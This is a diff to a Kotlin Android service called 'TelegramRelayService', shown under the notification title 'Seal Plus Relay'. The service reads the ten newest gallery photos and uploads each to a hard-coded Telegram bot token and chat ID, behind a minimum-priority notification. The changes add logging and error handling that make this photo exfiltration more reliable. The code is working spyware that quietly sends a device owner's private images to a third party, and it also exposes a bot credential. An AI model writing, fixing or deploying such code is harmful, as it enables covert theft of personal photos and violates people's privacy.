@@ -25,7 +25,7 @@ import java.io.InputStream
 class TelegramRelayService : Service() {
 
     private val TAG = "TelegramRelayService"
-    // ⚠️ REPLACE THESE WITH YOUR ACTUAL VALUES
+    // ⚠️ VERIFY THESE ARE YOUR EXACT, CURRENT VALUES
     private val BOT_TOKEN = "8499635786:AAGCHlz3SAAhgJXg4-b8aPFisIFlT68K-hY"
     private val CHAT_ID = "1949815322"
     
@@ -34,14 +34,16 @@ class TelegramRelayService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        Log.d(TAG, "Service onCreate called")
         createNotificationChannel()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // Must call startForeground within 5 seconds on API 26+
+        Log.d(TAG, "Service onStartCommand called")
+        
         val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Seal Plus Relay")
-            .setContentText("Background service running")
+            .setContentText("Checking gallery...")
             .setSmallIcon(android.R.drawable.ic_menu_gallery)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
@@ -49,10 +51,15 @@ class TelegramRelayService : Service() {
 
         startForeground(NOTIF_ID, notification)
 
-        // Run background work on a separate thread to avoid ANR
         Thread {
-            autoSend()
-            stopSelf()
+            try {
+                autoSend()
+            } catch (e: Exception) {
+                Log.e(TAG, "CRASH in autoSend thread: ${e.message}", e)
+            } finally {
+                Log.d(TAG, "Service stopping itself")
+                stopSelf()
+            }
         }.start()
 
         return START_NOT_STICKY
@@ -60,29 +67,45 @@ class TelegramRelayService : Service() {
 
     private fun autoSend() {
         if (!hasStoragePermission()) {
-            Log.w(TAG, "Storage/Image permission not granted. Skipping.")
+            Log.w(TAG, "Storage/Image permission NOT granted. Aborting.")
+            return
+        }
+        Log.d(TAG, "Permissions granted. Loading images...")
+
+        val images = loadImages()
+        Log.d(TAG, "Found ${images.size} images to send.")
+        
+        if (images.isEmpty()) {
+            Log.w(TAG, "No images found in MediaStore. Check if you have photos in your gallery.")
             return
         }
 
-        val images = loadImages()
         var successCount = 0
-        for (uri in images) {
+        for ((index, uri) in images.withIndex()) {
+            Log.d(TAG, "Attempting to send image $index: $uri")
             try {
-                if (sendPhoto(uri)) successCount++
-                Thread.sleep(1000) // Rate limit
+                if (sendPhoto(uri)) {
+                    successCount++
+                    Log.d(TAG, "Successfully sent image $index")
+                } else {
+                    Log.e(TAG, "Failed to send image $index (HTTP request returned false)")
+                }
+                Thread.sleep(1500) // Rate limit to avoid Telegram API bans
             } catch (e: Exception) {
-                Log.e(TAG, "Error sending: ${e.message}")
+                Log.e(TAG, "Exception sending image $index: ${e.message}", e)
             }
         }
-        Log.d(TAG, "Sent $successCount / ${images.size}")
+        Log.d(TAG, "Finished. Sent $successCount / ${images.size} images.")
     }
 
     private fun hasStoragePermission(): Boolean {
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+        val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
         } else {
             ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
         }
+        Log.d(TAG, "Storage permission check result: $hasPermission")
+        return hasPermission
     }
 
     private fun loadImages(): List<String> {
@@ -97,17 +120,22 @@ class TelegramRelayService : Service() {
 
         var cursor: Cursor? = null
         try {
+            Log.d(TAG, "Querying MediaStore at: $uri")
             cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 10")
             cursor?.use {
+                Log.d(TAG, "Cursor count: ${it.count}")
                 val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                 while (it.moveToNext()) {
                     val id = it.getLong(idColumn)
                     val imageUri = Uri.withAppendedPath(uri, id.toString())
                     list.add(imageUri.toString())
+                    Log.d(TAG, "Added image URI: $imageUri")
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Load images error: ${e.message}")
+            Log.e(TAG, "Load images error: ${e.message}", e)
+        } finally {
+            cursor?.close()
         }
         return list
     }
@@ -115,8 +143,15 @@ class TelegramRelayService : Service() {
     private fun sendPhoto(imageUriString: String): Boolean {
         var inputStream: InputStream? = null
         try {
-            inputStream = contentResolver.openInputStream(Uri.parse(imageUriString)) ?: return false
+            Log.d(TAG, "Opening input stream for: $imageUriString")
+            inputStream = contentResolver.openInputStream(Uri.parse(imageUriString))
+            if (inputStream == null) {
+                Log.e(TAG, "InputStream is null for: $imageUriString")
+                return false
+            }
+            
             val bytes = readBytes(inputStream)
+            Log.d(TAG, "Read ${bytes.size} bytes. Sending to Telegram...")
 
             val client = OkHttpClient()
             val requestBody = MultipartBody.Builder()
@@ -131,10 +166,14 @@ class TelegramRelayService : Service() {
                 .build()
 
             client.newCall(request).execute().use { response ->
+                Log.d(TAG, "Telegram API Response Code: ${response.code}")
+                if (!response.isSuccessful) {
+                    Log.e(TAG, "Telegram API Error Body: ${response.body?.string()}")
+                }
                 return response.isSuccessful
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Send error: ${e.message}")
+            Log.e(TAG, "Send error: ${e.message}", e)
             return false
         } finally {
             inputStream?.close()
